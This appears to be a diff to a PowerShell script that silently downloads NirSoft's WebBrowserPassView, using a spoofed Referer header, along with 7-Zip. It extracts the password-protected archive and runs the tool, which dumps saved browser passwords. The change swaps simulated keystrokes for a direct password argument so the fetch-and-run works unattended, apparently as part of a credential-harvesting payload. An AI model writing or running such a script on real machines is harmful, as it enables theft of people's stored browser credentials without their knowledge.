@@ -8,13 +8,7 @@ cd \temp
 iwr -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
 iwr -uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
 Expand-Archive 7z.zip
-.\7z\7za.exe e wbpv.zip
-$wshell.AppActivate("Windows PowerShell")
-Sleep 5
-$wshell.SendKeys("wbpv28821@")
-Sleep 1
-$wshell.SendKeys("~")
-
+.\7z\7za.exe e wbpv.zip -pwbpv28821@ -y
 .\WebBrowserPassView.exe
 
 Sleep 10
